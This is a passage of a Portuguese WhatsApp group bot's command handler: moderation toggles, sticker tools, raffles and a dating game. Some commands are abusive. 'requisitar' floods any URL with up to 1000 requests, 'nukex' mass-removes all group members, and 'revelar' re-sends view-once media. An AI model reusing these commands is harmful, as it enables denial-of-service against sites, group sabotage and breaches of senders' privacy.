texto = args.join(' ').toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "")
if(!isPalavras.includes(texto)) return enviar('Já foi removida')
var i = dataGp[0].antipalavrao.palavras.indexOf(texto)
dataGp[0].antipalavrao.palavras.splice(i, 1)
setGp(dataGp)
enviar('Palavrão removido da lista com sucesso!')
break

case 'listapalavrão': case 'listapalavra':
case 'listpalavra':
if(!isPalavrao) return enviar('Anti palavrão desativado!')
let lbw = `Esta é a lista de palavrão\nTotal: ${isPalavras.length}\n`
for (let i of isPalavras) {
lbw += `➸ ${i}\n`
}
await enviar(lbw)
break

case 'limitecaracteres':
case 'limiteflood':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAntiFlood) {
dataGp[0].limitec.active = true
setGp(dataGp)
enviar(`O recurso limite de caracteres foi ativado nesse grupo.`)
} else if(isAntiFlood) {
dataGp[0].limitec.active = false
setGp(dataGp)
enviar('O recurso limite de caracteres foi desativado nesse grupo.️')
}
break

case 'limitec_global':
case 'limitec': {
if(!SoDono) return enviar(arise.donosmt)
if(!isAntiFlood) return enviar(`Ative este recurso limiteflood`)
if(!q) return enviar(`Cade a quantidade? Ex: ${prefix + command} 5000`)
if(isNaN(q) == true) return enviar('Digite apenas números')
if(command == 'limitec'){
dataGp[0].limitec.quantidade = q
setGp(dataGp)
enviar(`Foi alterado o limite de caracteres para: ${q}`)
} else {
var daty = { limitefl: q }
fs.writeFileSync('./banco de dados/usuarios/flood.json', JSON.stringify(daty, null, '\t'))
enviar(`Foi adicionado um limite global de caracteres de: ${q}`)
}
}
break

case 'status':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins && !SoDono && !info.key.fromMe) return enviar(arise.adm)
reagir(from, "👷🏻‍♂️")
await client.relayMessage(from, {interactiveMessage: {header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({image: {url: ftmenu.logo}}, {upload: client.waUploadToServer})), hasMediaAttachment: false, title: mess.statusBot(isAntiImg, isAntiVid, Antidoc, isAntiCtt, Antiloc, isAntilinkgp, isAntiLinkHard, isAntifake, isAntiNotas, isAnticatalogo, isPalavrao, isX9VisuUnica, isWelkom, isAutofigu, isAutorepo, isModobn, isModoAluguel, isLevelingOn, isAntiFlood, isAutodown)}), body: { text: "" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "「 💙 」𝐓𝐎𝐃𝐀𝐒 𝐎𝐏𝐂「 💙 」",
sections: [
{
title: `${NomeDoBot}`,
highlight_label: "👨🏻‍💻",
rows: [
{
title: "️⚙️ 𝖠𝗇𝗍𝗂 𝖣𝗈𝖼𝗎𝗆𝖾𝗇𝗍𝗈 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antidoc`,
disabled: false
},
{
title: "️⚙️ 𝖠𝗇𝗍𝗂 𝖨𝗆𝖺𝗀𝖾𝗆 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antiimg`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖵𝗂𝖽𝖾𝗈 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antivideo`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖢𝗈𝗇𝗍𝖺𝗍𝗈 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antictt`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖫𝗈𝖼𝖺𝗅𝗂𝗓𝖺𝖼𝖺𝗈 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antiloc`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖫𝗂𝗇𝗄 𝖣𝖾 𝖦𝗋𝗎𝗉𝗈𝗌.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antilinkgp`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖫𝗂𝗇𝗄𝖧𝖺𝗋𝖽 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antilinkhard`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖥𝖺𝗄𝖾 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antifake`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖭𝗈𝗍𝖺𝗌 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antinotas`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖢𝖺𝗍𝖺𝗅𝗈𝗀𝗈 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}anticatalogo`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗇𝗍𝗂 𝖯𝖺𝗅𝖺𝗏𝗋𝖺𝗈 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}antipalavrao`,
disabled: false
},
{
title: "️️⚙️ 𝖫𝗂𝗆𝗂𝗍𝖾 𝖢𝖺𝗋𝖺𝖼𝗍𝖾𝗋𝗌 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}limiteflood`,
disabled: false
},
{
title: "️️⚙️ 𝖠𝗎𝗍𝗈 𝖷𝟫-𝗏𝗂𝗌𝗎𝗇𝗂𝖼𝖺 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}x9visuunica`,
disabled: false
},
{
title: "️️⚙️ 𝖡𝖾𝗆-𝗏𝗂𝗇𝖽𝗈 𝖲𝖺𝗎𝖽𝖺𝖼𝗈𝖾𝗌 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}bemvindo`,
disabled: false
},
{
title: "️⚙️ 𝖠𝗎𝗍𝗈 𝖢𝗋𝗂𝖺𝗋 𝖥𝗂𝗀𝗎𝗋𝗂𝗇𝗁𝖺𝗌 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}autofigu`,
disabled: false
},
{
title: "⚙️ 𝖠𝗎𝗍𝗈 𝖱𝖾𝗌𝗉𝗈𝗇𝖽𝖾𝗋 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}autorepo`,
disabled: false
},
{
title: "️⚙️ 𝖬𝗈𝖽𝗈 𝖡𝗋𝗂𝗇𝖼𝖺𝖽𝖾𝗂𝗋𝖺 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}modozoeira`,
disabled: false
},
{
title: "️⚙️ 𝖬𝗈𝖽𝗈 𝖠𝗅𝗎𝗀𝗎𝖾𝗅 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}modoaluguel`,
disabled: false
},
{
title: "️⚙️ 𝖬𝗈𝖽𝗈 𝖫𝖾𝗏𝖾𝗅𝗂𝗇𝗀 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}leveling`,
disabled: false
},
{
title: "️⚙️ 𝖬𝗈𝖽𝗈 𝖠𝗎𝗍𝗈𝖽𝗈𝗐𝗇 𝖭𝗈 𝖦𝗋𝗎𝗉𝗈.",
description: "Acesso exclusivo apenas para os moderadores.",
id: `${prefix}autodown`,
disabled: false
}
]
}
]
}),
messageParamsJson: ""
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"「 ☁️ 」𝐇𝐎𝐒𝐓 𝐒𝐂𝐀𝐋𝐄「 ☁️ 」\",\"url\":\"https://hostscale.shop\",\"merchant_url\":\"https://hostscale.shop\"}"
}
]
}
}
}, {});
break

case 'reiniciar': case 'rn':
if(!isGroupAdmins && !SoDono) return enviar(arise.adm)
setTimeout(async () => {
await sleep(300)
enviar("⚙️ reiniciando o sistema, aguarde 3 segundos para minha auto reconexão ⚙️")
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break

case 'novoqr':
if(!SoDono) return enviar(arise.donosmt);
enviar("Será apagado o qrcode, e irá gerar um novo, fique atento no terminal para ler novamente.");
setTimeout(() => {
fs.rmdirSync(folderUserAuth, { recursive: true}); }, 1500)
break;

//==========(Sticker-Stickers)===========\\

case 'fstiker':
case 'fsticker':
case 'f': {
await escrever()
await randomreact();
await sleep(1000)
var RSM = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var boij = RSM?.imageMessage || info.message?.imageMessage || RSM?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage || RSM?.viewOnceMessage?.message?.imageMessage
var boij2 = RSM?.videoMessage || info.message?.videoMessage || RSM?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage || RSM?.viewOnceMessage?.message?.videoMessage  
if(boij) {
var pack = `👤 Proprietário: ${pushname || 'desconhecido'}

🍧 visitem-me no instagram
🍪 instagram.com/euzenom`;
owgi = await getFileBuffer(boij, 'image')
let encmediaa = await sendImageAsSticker(client, from, owgi, info, { packname:pack})
await DLT_FL(encmediaa)
} else if(boij2 && boij2?.seconds < 11) {
var pack = `👤 Proprietário: ${pushname || 'desconhecido'}

🍧 visitem-me no instagram
🍪 instagram.com/euzenom`;
owgi = await getFileBuffer(boij2, 'video')
let encmedia = await sendVideoAsSticker(client, from, owgi, info, { packname:pack})
await DLT_FL(encmedia)
} else {
enviar('Envie imagem / vídeo / gif com legenda \nsticker (duração do adesivo de vídeo de 1 a 10 segundos)')
}
}
break

case 'revelar':
case 'revertervisu':
case 'revertvisu': {
await reagir(from, '⏳');
try {
const quoted = info.message?.extendedTextMessage?.contextInfo?.quotedMessage;
const imgMsg = quoted?.imageMessage || quoted?.viewOnceMessageV2?.message?.imageMessage || quoted?.viewOnceMessage?.message?.imageMessage;
const vidMsg = quoted?.videoMessage || quoted?.viewOnceMessageV2?.message?.videoMessage || quoted?.viewOnceMessage?.message?.videoMessage;
if (!imgMsg && !vidMsg) {
await enviar('Marque uma *visualização única* (imagem ou vídeo) e use o comando novamente.');
}
if (imgMsg) {
const buffer = await getFileBuffer(imgMsg, 'image');
await safeSendMessage(from, {image: buffer}, {quoted: non});
await reagir(from, '✅');
} else if (vidMsg) {
const buffer = await getFileBuffer(vidMsg, 'video');
await safeSendMessage(from, {video: buffer, mimetype: 'video/mp4'}, {quoted: non});
await reagir(from, '✅');
}
} catch (err) {
console.error('Erro em revertervisu:', err);
await reagir(from, '❌');
enviar('Ocorreu um erro ao reverter a visualização única. Tente novamente mais tarde.');
}
}
break;

case 's':
case 'stk':
case 'sticker':
reagir(from, '⏳')
var RSM = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var boij2 = RSM?.imageMessage || info.message?.imageMessage || RSM?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage || RSM?.viewOnceMessage?.message?.imageMessage
var boij = RSM?.videoMessage || info.message?.videoMessage || RSM?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage || RSM?.viewOnceMessage?.message?.videoMessage
if(boij2){
var pack = `👤 Proprietário: ${pushname || 'desconhecido'}

🍧 visitem-me no instagram
🍪 instagram.com/euzenom`;
owgi = await getFileBuffer(boij2, 'image')
let encmediaa = await sendImageAsSticker2(client, from, owgi, info, { packname:pack})
await DLT_FL(encmediaa)
} else if(boij && boij.seconds < 11){
var pack = `👤 Proprietário: ${pushname || 'desconhecido'}

🍧 visitem-me no instagram
🍪 instagram.com/euzenom`;
owgi = await getFileBuffer(boij, 'video')
let encmedia = await sendVideoAsSticker2(client, from, owgi, info, { packname:pack})
await DLT_FL(encmedia)
} else {
return enviar(`Marque uma imagem, ou um vídeo de ate 9.9 segundos, ou uma visualização única, com o comando ${prefix + command}`)
}
break

case 'rename':
case 'roubar':
await escrever()
await randomreact();
await sleep(1000)
if(!isQuotedSticker) return enviar('Marque uma figurinha...')
var kls = q
var pack = kls.split("|")[0];
var author2 = kls.split("|")[1];
if(!q) return enviar('*Falta um nome para renomear a figurinha.*')
if(!pack) return enviar(`*Necessita de um nome antes da barra ( | )*`)
renameContextSticker(pack, author2, `RENOMEADA COM SUCESSO`, info)
.catch((err) => {
enviar(`❌ Erro, tente mais tarde`); 
})
break

case 'toimg':
if(!isQuotedSticker) return enviar('Por favor, *mencione um sticker* para executar o comando.')
reagir(from, "⏳")
try {
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
safeSendMessage(from, {image: buff}, {quoted: non}).catch(e => {
console.log(e);
enviar('Ocorreu um erro ao converter o *sticker para imagem.*')
})
} catch {
enviar(mess.error())
}
break

case 'togif': 
if(!isQuotedSticker) return reply('Por favor, atribua uma figurinha animada à mensagem para realizar a conversão para vídeo/gif.');
reagir(from, "⏳")
try {
if((isMedia && !info.message.videoMessage || isQuotedSticker) && !q.length <= 1) {
const { FiguMp4OuGif } = require('./exports/sticker/togif.js');
getBufferWebP = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
fs.writeFileSync("./exports/sticker/convert.webp", getBufferWebP);
 outputFile = "./exports/sticker/convert.webp";
convertWebP = await FiguMp4OuGif(outputFile);
await safeSendMessage(from, {video: {url: convertWebP}, gifPlayback: true, fileName: 'sticker-sb.gif'}, {quoted: non}).catch(async(error) => {
await enviar(mess.error()); // Notificar ao usuário que ocorreu um erro ao enviar o resultado da conversão do WebP para MP4.
await DLT_FL(outputFile); // Apagar o arquivo, caso ocorrer um erro na conversão entre eles.
console.log(error)
});
}
} catch(error) {
await enviar(mess.error()); // Notificar ao usuário que ocorreu um erro ao realizar a conversão do WebP para MP4.
console.log(error)
};
break

//========(SORTEIO-VOTAR-CASES)=========\\

case 'arquivo':
if(!SoDono)return enviar('voce não é o yato')
if(isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(`./${q}`, doc)
enviar(`O arquivo './${q}' foi atualizado.`)
} else {
enviar('Marque o documento ou o arquivo que deseja substituir..')
}
break

case 'totalcmd':
case 'totalcomando':
if(!SoDono) return enviar(arise.donosmt)
fs.readFile('./index.js', 'utf8', (err, data) => { 
 if (err) throw err;
 let regex = /case\s'(\w+)'/g;
 let match;
 let caseNames = [];
 while ((match = regex.exec(data)) !== null) {
 caseNames.push(match[1]);
 }
 let output = '' + caseNames.join('\n• ');
 let totalCount = caseNames.length;
enviar(`*Olá ${pushname}*

EU TENHO: ${totalCount} COMANDOS ✅`);
});
break

case 'getcase':
case 'puxar':
try {
if (!SoDono) return enviar(arise.donosmt)
if(!q) return enviar('Qual nome da case?')
enviar('Seu pedido é uma ordem! 🤓')
const getCase = (cases) => {
return 'case '+`'${cases}'`+fs.readFileSync("./index.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
await sleep(500)
msgSemQuoted(`${getCase(q)}`)
} catch(e) {
enviar('A case não foi encontrada, você deve ter escrito errado...')
}
break

case 'figu-random':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
async function eitamundobon() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-aleatoria`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamundobon()
}
break

case 'figu-raiva':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
async function eitamundoraiva() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-raiva`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamundoraiva()
}
break

case 'figu-desenho':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
await sleep(1000)
async function eitamundobcvxx() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-desenho`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamundobcvxx()
}
break

case 'figu-flork':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
await sleep(1000)
async function eitamundoflork() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-flork`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamundoflork()
}
break

case 'figu-roblox':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
await sleep(1000)
async function eitamundoroblox() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-roblox`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamundoroblox()
}
break

case 'figu-anime':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
await sleep(1000)
async function eitxmundobom() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-anime`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitxmundobom()
}
break

case 'figu-coreana':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
await sleep(1000)
async function eitamxndobom() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-coreana`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamxndobom()
}
break

case 'figu-animais':
if(!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
if(!q) return enviar('cadê a quantidade?');
reagir(from, '✅')
await sleep(1000)
async function eitamundoruim() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-animais`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamundoruim()
}
break

case 'requisitar': {
if (!args[0]) return enviar('❌ Cadê a URL do site?');
if (!args[1]) return enviar('❌ Cadê a quantidade de requisições?');
const apiUrl = args[0];
const qtd = parseInt(args[1]);
if (isNaN(qtd) || qtd < 1 || qtd > 1000);
if (qtd > 1000) return enviar('⚠️ O limite máximo é 1000 requisições por vez.');
reagir(from, "⏳")
enviar(`🔁 Enviando ${qtd} requisições para a url:\n🌐 ${apiUrl}`);
for (let i = 0; i < qtd; i++) {
setTimeout(() => {
require('axios').get(apiUrl).catch(() => {});
}, i * 100);
}
setTimeout(() => {
reagir(from, "✅");
}, 12000);
break;
}

case 'figu-engracada':
if (!q) return enviar('cadê a quantidade?')
if (!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
enviar('Enviando suas figurinhas..')
await sleep(1000)
async function eitamunzzbom() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-engracada`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamunzzbom()
}
break

case 'figu-emojis':
if (!q) return enviar('cadê a quantidade?')
if (!q > 10) return enviar('O limite máximo é de 10 figurinhas!');
enviar('Enviando suas figurinhas..')
await sleep(1000)
async function eitamundobebe() {
safeSendMessage(from, { sticker: { url: `https://neon-apis.shop/api/figu-emoji`} })}
for (i = 0; i < q; i++) {
await sleep(500)
eitamundobebe()
}
break

/*case 'add': case 'unkick':
if(!SoDono && !isGroupAdmins) return enviar(arise.adm);
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!q && info.message.extendedTextMessage === null) return enviar('⚠️ Coloque o número de quem você quer adicionar no grupo.')
try {
useradd = `${args.join(" ").replace(/\D/g,'')}` ? `${args.join(" ").replace(/\D/g,'')}` : info.message.extendedTextMessage.contextInfo.participant
let id = `${useradd.replace(/\D/g,'')}`
if(!id) return enviar(`Número inválido.`)
let [result] = await client.onWhatsApp(id)
if(!result) return enviar(`Esse número não está registrado no WhatsApp.`)
let response = await client.groupParticipantsUpdate(from, [result.jid], "add")
if(response[0].status == "409") {
safeSendMessage(from, {text: `⚠️ Contato já está no grupo, meu senhor!`, mentions: [result.jid, sender]})
} else if(response[0].status == "403") {
safeSendMessage(from, {text: `⚠️ Não consegui adicionar ${result.jid.split("@")[0]} porque privou a conta ou saiu recentemente.`, mentions: [result.jid, sender]})
} else if(response[0].status == "408") {
safeSendMessage(from, {text: `⚠️ Não consegui adicionar ${result.jid.split("@")[0]} porque saiu do grupo.`, mentions: [result.jid, sender]})
} else if(response[0].status == "401") {
safeSendMessage(from, {text: `⚠️ Não consegui adicionar ${result.jid.split("@")[0]} porque me bloqueou.`, mentions: [result.jid, sender]})
} else if(response[0].status == "200")
reagir(from, "✅");
} catch(e) {
console.log("[ERROR]:"+ e)
}
break*/

case 'ban': case 'banir': case 'kick':
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
try {
if(!menc_os2 || menc_jid2[1]) return enviar("⚠️ Marque a mensagem do usuário ou marque o @ dele, lembre de só marcar um usuário.")
if(!JSON.stringify(groupMembers).includes(menc_os2)) return enviar("⚠️ Este usuário já foi removido do grupo ou saiu recentemente.")
if(botNumber.includes(menc_os2)) return enviar('⚠️ Porque eu removeria eu mesmo? voce deveria se curvar perante a min. e nao vim com brincadeiras.')
if(JSON.stringify(numerodono).indexOf(menc_os2) >= 0) return enviar('⚠️ Não irei remover meu criador.')
client.groupParticipantsUpdate(from, [menc_os2], "remove")
reagir(from, "✅");
} catch (e) {
console.log(e)
}
break

case 'promover': 
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!menc_os2 || menc_jid2[1]) return enviar("⚠️ Marque a mensagem do usuário ou marque o @ dele, lembre de só marcar um usuário.")
if(!JSON.stringify(groupMembers).includes(menc_os2)) return enviar("⚠️ Esse usuário foi removido do grupo ou saiu, não será possível promover.")
client.groupParticipantsUpdate(from, [menc_os2], "promote")
reagir(from, "✅");
break

case 'rebaixar': 
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!menc_os2 || menc_jid2[1]) return enviar("⚠️ Marque a mensagem do usuário ou marque o @ dele, lembre de só marcar um usuário.")
if(!JSON.stringify(groupMembers).includes(menc_os2)) return enviar("⚠️ Este usuário foi removido do grupo ou saiu, não será possível rebaixar.")
client.groupParticipantsUpdate(from, [menc_os2], "demote")
reagir(from, "✅");
break

case 'sorteio':
if(!isGroupAdmins) return enviar(arise.adm)
try{
if(!isGroup) return enviar(arise.grupo)
if(!q) return enviar(`⚠️ Coloque algo, após o comando sorteio, por exemplo, sorteio de 100 R$`)
d = []
teks = `🎉 Meus parabéns ao vencedor do sorteio:\n-\n• *Premio:* ${q}\n`
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `• *vencedor:*  @${groupMembers[r].id.split('@')[0]}`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break

case 'nukex': case 'arquivargp':
if(!SoDono && !isBotGroupAdmins) return enviar(arise.Badmin)
if(info.key.fromMe) return 
blup = []
for ( i of groupMembers) {
if(!numerodono.includes(i.id)) blup.push(i.id)
}
blup.splice(blup.indexOf(botNumber), 1)
for ( i = 0; i < blup.length; i++) {
await sleep(100)
client.groupParticipantsUpdate(from, [blup[i]], 'remove')
} 
break

case 'gerarnick':
try {
await escrever()
await randomreact();
await sleep(1000)
if(!q.trim()) return enviar(`🔹 Uso correto: ${prefix + command} yato`);
ABC = await fetchJson(`https://neon-apis.shop/api/fazernick?nome=${q}`)
AB = `Lista com base no nick informado:\n\n`;
for ( i of ABC) {
AB += `${i}\n\n`;
}
enviar(AB);
} catch (e) {
return enviar("Erro..");
}
break;

case 'chance':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)
var avb = body.slice(7)
if(!q) return safeSendMessage(from, {text: `⚠️ Você precisa digitar da forma correta\nExemplo: ${prefix}chance do nobru pegar a rajah.`}, {quoted: non})
random = `${Math.floor(Math.random() * 100)}`
hasil = `A chance ${body.slice(8)} é de... ${random}%`
safeSendMessage(from, {text: hasil, mentions: [sender]}, {quoted: non})
break

case 'namorar': case 'pediremnamoro':
setTimeout(() => {reagir(from, "💍")}, 300)
if(!isGroup) return enviar(arise.grupo)
if(!q)
if(!menc_os2) return enviar('⚠️ Marque a mensagem ou o @ da pessoa!')
if(botNumber.includes(menc_os2)) return enviar("⚠️ Não é possível me pedir em namoro, eu sou um rei e voce um(a) simples plebeu.")
if(JSON.stringify(namoro2).includes(menc_os2)) return enviar(`⚠️ Este usuário já foi pedido em namoro.`)
if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == false) return enviar(`⚠️ Essa pessoa já pediu alguém em namoro, sinto muito ${pushname} 😕`)
if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == true) return enviar(`⚠️ Não será possível pedir essa pessoa em namoro, pois a mesma já está com outro(a). 🌚`)
if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == false) return mention(`⚠️ Você já pediu para namorar com o (a) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}. Não brinque com os sentimentos dos outros! Se decida logo ou digite: ${prefix}cancelarpedido`)
if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == true) return mention(`⚠️ Você já está namorando com o (a) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}.`)
namoro1.push({usu1: sender, usu2: menc_os2.split('@')[0], namorados: false, idgp: from, hora: hora, data: date})
fs.writeFileSync("./banco de dados/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.push({id: menc_os2, pedido: sender.split('@')[0], idgp: from})
fs.writeFileSync("./banco de dados/func/namoro2.json", JSON.stringify(namoro2))
mention(`🌟🥳 Olá *@${menc_os2.split('@')[0]}*! Você acaba de ser pedido(a) em namoro por *@${sender.split('@')[0]}*.\nEai você aceita o pedido, *sim ou não?* nós dê sua resposta!`);
break

case 'cancelarpedido':
if(!isGroup) return enviar(arise.grupo)
if(!JSON.stringify(namoro1).includes(sender)) return enviar("⚠️ Não há pedido de namoro para cancelar.")
C13 = namoro1.map(i => i.usu1).indexOf(sender)
C15 = namoro2.map(i => i.id).indexOf(namoro1[C13].usu2 + "@s.whatsapp.net")
if(namoro1[C13].namorados == true) return enviar("⚠️ Não é possível cancelar o pedido de namoro depois de aceito.")
namoro1.splice(C13, 1)
fs.writeFileSync("./banco de dados/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C15, 1)
fs.writeFileSync("./banco de dados/func/namoro2.json", JSON.stringify(namoro2))
enviar("⚠️ Pedido de namoro cancelado com sucesso.")
break

case 'terminar_namoro':
if(!JSON.stringify(namoro1).includes(sender)) return enviar(`⚠️ Você não está namorando com ninguém. Sinto muito!`);
if (JSON.stringify(namoro1).includes(sender)) {
let idx1 = namoro1.map(i => i.usu1).indexOf(sender);
if (idx1 !== -1) {
mention(`💔 O relacionamento entre @${namoro1[idx1].usu1.split("@")[0]} e @${namoro1[idx1].usu2.split("@")[0]} foi encerrado.`);
namoro1.splice(idx1, 1);
fs.writeFileSync("./banco de dados/func/namoro1.json", JSON.stringify(namoro1, null, 2));
}
}
if (JSON.stringify(namoro2).includes(sender)) {
let idx2 = namoro2.map(i => i.id).indexOf(sender);
if (idx2 !== -1) {
namoro2.splice(idx2, 1);
fs.writeFileSync("./banco de dados/func/namoro2.json", JSON.stringify(namoro2, null, 2));
}
}
break;

case 'minhadupla': case 'dupla':
if(!isGroup) return enviar(arise.grupo)
if(!JSON.stringify(namoro1).includes(sender)) return enviar(`⚠️ Você não está namorando com ninguém. Sinto muito!`)
reagir(from, "❤️‍🩹")
D1 = namoro1.map(i => i.usu1).indexOf(sender)
if(namoro1[D1].namorados == false) return enviar(`⚠️ A pessoa que você pediu em namoro não aceitou o pedido ainda. Portanto, não é possível consultar os dados da dupla.️`)
txt = `💝 Você está namorando essa pessoinha aqui no momento:\n👥 wa.me/${namoro1[D1].usu2}\n–\n📆 Pedido feito dia: ${namoro1[D1].data}\n-\n✨️ Felicidades aos pombinhos, que nunca falte amor e união no relacionamento de vocês.`
